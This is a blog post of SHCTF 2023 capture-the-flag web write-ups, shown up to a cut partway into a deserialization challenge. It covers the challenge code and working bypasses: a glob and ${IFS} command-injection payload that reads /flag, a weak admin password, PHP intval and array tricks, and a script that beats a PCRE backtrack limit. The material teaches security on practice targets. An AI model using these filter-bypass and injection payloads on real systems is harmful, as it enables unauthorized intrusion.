<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="SHCTF 2023-wp, hybcx&#39;s blog">
    <meta name="description" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>SHCTF 2023-wp | hybcx&#39;s blog</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 6.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">hybcx&#39;s blog</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">hybcx&#39;s blog</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">SHCTF 2023-wp</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/CTF%E8%B5%9B%E4%BA%8B/">
                                <span class="chip bg-color">CTF赛事</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/CTF%E8%B5%9B%E4%BA%8B/" class="post-category">
                                CTF赛事
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2023-10-02
                </div>
                

                

                

                

                
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1>0x01 前言</h1>
<p>最近新生比赛太多了，一打开全是web题，看着就爽(bushi，做下来之后发现一点都不新生┭┮﹏┭┮，可能是我太菜了。但总体下来感觉每个赛事都还不错，要说最有难度的还是moectf了，很烦。但总体体验下来还是SHCTF舒服，平台绚丽、体验感也贼好等等（反正各种舒服吧），更何况还是"山河CTF"，我就是山河人啊┭┮﹏┭┮。话不多说开始写wp</p>
<h1>0x02 玩转题目</h1>
<p>先从最简单的开始吧</p>
<h2 id="WEB">WEB</h2>
<h3 id="WEEK1-飞机大战">[WEEK1]飞机大战</h3>
<p><img src="image-20231002165620335.png" alt="image-20231002165620335"></p>
<p>首先依旧是亲切无比的游戏，我们先点开看看</p>
<p><img src="image-20231002165742671.png" alt="image-20231002165742671"></p>
<p><img src="image-20231002165757359.png" alt="image-20231002165757359"></p>
<p>嗯~~，非常熟悉的嘲讽，那我们按照常规思路直接审计一下相关js代码，进控制台查找</p>
<p><img src="image-20231002165914335.png" alt="image-20231002165914335"></p>
<p>进去的时候看到敏感字符score，那猜测应该是修改score以达到获取flag，我们继续跟踪score</p>
<p><img src="image-20231002170013762.png" alt="image-20231002170013762"></p>
<p>这里是一些对score的判断</p>
<p><img src="image-20231002170048124.png" alt="image-20231002170048124"></p>
<p>看到上图的时候发现是对score达到要求的函数操作，但似乎没有用的信息，于是我墨迹了一会儿想到，游戏失败会弹窗，那成功了大概率也是弹窗。凭借此思路我们可以想到是否可以找到关于"游戏胜利的处理函数"看看内部有什么信息，于是我继续找发现了won函数（类似win：胜利）</p>
<p><img src="image-20231002170252784.png" alt="image-20231002170252784"></p>
<p>如图发现alert弹窗函数，以及uniccode编码字符串，那我们解码一下看看</p>
<p><img src="image-20231002170341536.png" alt="image-20231002170341536"></p>
<p>嗯！亲切的base64，解码即可得到flag</p>
<p><img src="image-20231002170406433.png" alt="image-20231002170406433"></p>
<h3 id="WEEK1-babyRCE">[WEEK1]babyRCE</h3>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$rce</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'rce'</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$rce</span>)) {<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\&gt;|\&lt;|\'|\"/i"</span>, <span class="hljs-variable">$rce</span>)) {<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$rce</span>);<br>    }<span class="hljs-keyword">else</span> {<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">"hhhhhhacker!!!"</span>.<span class="hljs-string">"\n"</span>;<br>    }<br>} <span class="hljs-keyword">else</span> {<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>}<br></code></pre></td></tr></tbody></table></figure>
<p>很明显的rce嘛，但是过滤了很多，这里我也是比较菜记不住那么多知识点，只是在遇到的时候在网上冲浪找相关payload，于是乎翻到了如下：</p>
<h4 id="中括号匹配绕过">[]中括号匹配绕过</h4>
<p>例如**[a-c]** 代表匹配 a-b之间的字符,包括a,b字符本身</p>
<p>匹配范围为当前目录，例子如下</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/[a-c][h-j][m-o]/[b-d]a[s-u] flag.txt<br> <br>相当于<br>/bin/cat flag.txt<br> <br>因为[]匹配范围只在当前路径<br>所以要为bin绝对路径<br></code></pre></td></tr></tbody></table></figure>
<p>一定要注意绝对路径，相对路径是不可以的！</p>
<p>随后参考上述可以构造如下payload：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/[a-c][h-j][m-o]/[b-d]a[s-u]${IFS}/fl?g<br>也就是:/bin/cat flag;?:表示通配字符0或,也就是可以匹配任意一个字符<br>${IFS}在linux中可以代替空格<br><br>这里选/flag原因是通过构造ls${IFS}/得到的，只输入ls也会发现flag.php，不过这是假的<br></code></pre></td></tr></tbody></table></figure>
<p><img src="image-20231002171434401.png" alt="image-20231002171434401"></p>
<p><img src="image-20231002171456572.png" alt="image-20231002171456572"></p>
<h3 id="WEEK1-登录就给flag">[WEEK1]登录就给flag</h3>
<p>首页如下，这里只能在登录页面转悠，没什么信息的</p>
<p><img src="image-20231002171556583.png" alt="image-20231002171556583"></p>
<p>当时我想复杂了，先用dirsearch扫了扫，又bp抓包看了看，什么也没发现，最后尝试了万能密码和sql注入均无果，我以为这道题很难的，结果一位师傅告诉我直接弱口令啊，我还纳闷呢，我也试过啊，没这么简单吧。但我又想到我当时只是尝试了一下，随后我又去尝试，发现真的很简单：</p>
<p>直接admin：password就登陆进去了。。。。。。。。</p>
<p><img src="image-20231002171845988.png" alt="image-20231002171845988"></p>
<p><img src="image-20231002171851387.png" alt="image-20231002171851387"></p>
<p>拿到flag</p>
<h3 id="WEEK1-生成你的邀请函吧">[WEEK1]生成你的邀请函吧~</h3>
<p><img src="image-20231002171944121.png" alt="image-20231002171944121"></p>
<p>首页如下，再结合题目给的信息：</p>
<figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json">API：url/generate_invitation  <br>Request：POST application/json  <br>Body：<span class="hljs-punctuation">{</span>  <br>    <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Yourname"</span><span class="hljs-punctuation">,</span>  <br>    <span class="hljs-attr">"imgurl"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"http://q.qlogo.cn/headimg_dl?dst_uin=QQnumb&amp;spec=640&amp;img_type=jpg"</span>  <br><span class="hljs-punctuation">}</span>  <br><br>使用POST json请求来生成你的邀请函吧~flag就在里面哦~<br></code></pre></td></tr></tbody></table></figure>
<p>很显然就是抓包修改为上述格式即可，但这里注意不必放到repeater直接修改后放包即可，不然出来的图片你看不到，只能是一堆乱码</p>
<p><img src="image-20231002172127324.png" alt="image-20231002172127324"></p>
<p>添加指定url后抓包修改</p>
<p><img src="image-20231002172205055.png" alt="image-20231002172205055"></p>
<p>未修改前如上图；修改后如下图：</p>
<p><img src="image-20231002172317260.png" alt="image-20231002172317260"></p>
<p>直接放包即可</p>
<p><img src="image-20231002172359170.png" alt="image-20231002172359170"></p>
<p>放包之后会发现浏览器自动下载了图片 ，访问看到如下图flag，这里我是发到了微信直接利用微信的自带图片提取文字功能，大家有别的办法也可以</p>
<h3 id="WEEK1-1zzphp">[WEEK1]1zzphp</h3>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">'./index.txt'</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'c_ode'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'num'</span>]))<span class="hljs-comment">//判断参数是否存在</span><br>{<br>    <span class="hljs-variable">$code</span> = (String)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'c_ode'</span>];<span class="hljs-comment">//强制转换为字符串类型后赋值</span><br>    <span class="hljs-variable">$num</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'num'</span>];<span class="hljs-comment">//正常赋值</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/[0-9]/"</span>, <span class="hljs-variable">$num</span>))<span class="hljs-comment">//正则匹配</span><br>    {<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">"no number!"</span>);<br>    }<br>    <span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>))<span class="hljs-comment">//转换为整数类型</span><br>    {<br>      <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/.+?SHCTF/is'</span>, <span class="hljs-variable">$code</span>))<span class="hljs-comment">//还是正则匹配</span><br>      {<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">'no touch!'</span>);<br>      }<br>        <span class="hljs-comment">//找寻code字符串中第一次出现指定字符串的位置</span><br>      <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$code</span>,<span class="hljs-string">'2023SHCTF'</span>) === <span class="hljs-literal">FALSE</span>)<br>      {<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">'what do you want'</span>);<br>      }<br>      <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    }<br>}  <br></code></pre></td></tr></tbody></table></figure>
<p>emmm有难度的PHP特性（只怪我刷太少，太菜了┭┮﹏┭┮）</p>
<p>这里也是废了很长时间，最后也是百度找到的思路</p>
<p>首先第一个正则的话，做题多了就知道preg_match函数的特性：不能处理数组类型（会返回false），那我们直接将num赋值为：num[]=1，在之后的intval作用下会转换成1，即可绕过。</p>
<p>第二个呢是正则与stripos的配合绕过，分析得该正则要求你的code参数不能为SHCTF，且SHCTF前面不能有任意字符，但后续的stripos要求你的code参数必须含有2023SHCTF，所以这里花了我很长时间。</p>
<p>在此期间我尝试了数组等等，但均无果，之后网上漫游发现可以利用正则最大回溯绕过。那我们先来学习一下该知识点，先放出参考文章：</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html#0x01">PHP利用PCRE回溯次数限制绕过某些安全限制 | 离别歌</a></p>
<p>这篇文章很顶，解释的我都能看懂(<em>^▽^</em>)，但由于我概述能力不好，就结合别人的话语来阐释：</p>
<p>​		简单来说就是正则表达式匹配的时候某个.*将后面的字符全部匹配到了，导致表达式后面的式子没有地方匹配，因此一个一个字符吐出来，直到后面的式子全部匹配完毕或者回溯次数过多导致正则直接返回false：当然上述表述的前提下是要求正则表达式处于非贪婪模式或者NFA模式</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">NFA模式：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态（所谓的回溯也就是在返回前面的字符串进行重新匹配，直到正则表达式匹配完全），具体可参考上述文章。<br></code></pre></td></tr></tbody></table></figure>
<p>非贪婪模式：</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/UNION.+?SELECT/is'</span>, <span class="hljs-variable">$input</span>)) {<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">'SQL Injection'</span>);<br>}<br></code></pre></td></tr></tbody></table></figure>
<p>如同上述表达式如果我输入该语句：<code>UNION/*aaaaa*/SELECT</code>，这个正则表达式执行流程如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.+?匹配到/<br>因为非贪婪模式，所以.+?停止匹配，而由S匹配*<br>S匹配*失败，回溯，再由.+?匹配*<br>因为非贪婪模式，所以.+?停止匹配，而由S匹配a<br>S匹配a失败，回溯，再由.+?匹配a<br>...<br></code></pre></td></tr></tbody></table></figure>
<p>回溯次数随着a的数量增加而增加。所以，我们仍然可以通过发送大量a，来使回溯次数超出<code>pcre.backtrack_limit</code>限制，进而绕过WAF：</p>
<p><img src="image-20231002174640233.png" alt="image-20231002174640233"></p>
<p>注意正则匹配中的<code> ^.*、.*$、.</code>*就可以使用回溯，怎么回溯呢，只能上脚本了，因为一百万个字符，总不可能手写。我这里也是问GPT得到的脚本，因为我菜狗不会写┭┮﹏┭┮</p>
<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># 定义目标 URL</span><br>url = <span class="hljs-string">'http://112.6.51.212:30422/?num[]=1'</span>  <span class="hljs-comment"># 请将此处的 URL 替换为你要访问的实际 URL</span><br><br><span class="hljs-comment"># POST 请求参数</span><br>prefix_a = <span class="hljs-string">'a'</span> * <span class="hljs-number">1000000</span><br>post_params = {<span class="hljs-string">'c_ode'</span>: prefix_a + <span class="hljs-string">'2023SHCTF'</span>}<br><br><span class="hljs-comment"># 发送 POST 请求并获取响应</span><br>post_response = requests.post(url, data=post_params)<br><br><span class="hljs-comment"># 检查 POST 请求的响应</span><br><span class="hljs-keyword">if</span> post_response.status_code == <span class="hljs-number">200</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">"POST 请求成功"</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">"POST 响应内容:"</span>, post_response.text)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">"POST 请求失败"</span>)<br></code></pre></td></tr></tbody></table></figure>
<p>思路就是对该url进行请求，并传入相应的get和post参数，但在2023SHCTF之前要加入一百万个字符a，即可绕过</p>
<p><img src="image-20231002174921001.png" alt="image-20231002174921001"></p>
<p>成功拿到flag</p>
<h3 id="WEEK1-ez-serialize">[WEEK1]ez_serialize</h3>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-comment">//高亮代码</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>{<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$var_1</span>;<br>  <br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>{<span class="hljs-comment">//需要当对象被当成一个方法(也就是函数)调用时,invoke会自动调用</span><br>   <span class="hljs-keyword">include</span>(<span class="hljs-variable language_">$this</span>-&gt;var_1);<span class="hljs-comment">//这里一看就知道是敏感函数，大概是用来伪协议读取的</span><br>  }<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>{<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$q</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)//当开始反序列化的时候，<span class="hljs-title">wakeup</span>会被自动调用</span><br><span class="hljs-function"></span>{<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="hljs-variable">$this</span>-&gt;q)) {<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">"hacker"</span>;           <br>        }<span class="hljs-comment">//虽然这里的正则过滤的很多，但没啥用，可以忽略</span><br>}<br><br>}<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>{<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$z</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>{<span class="hljs-comment">//当一个类被当做字符串使用时，会自动调用</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;z-&gt;<span class="hljs-keyword">var</span>;<br>    }<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span></span>{<br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span 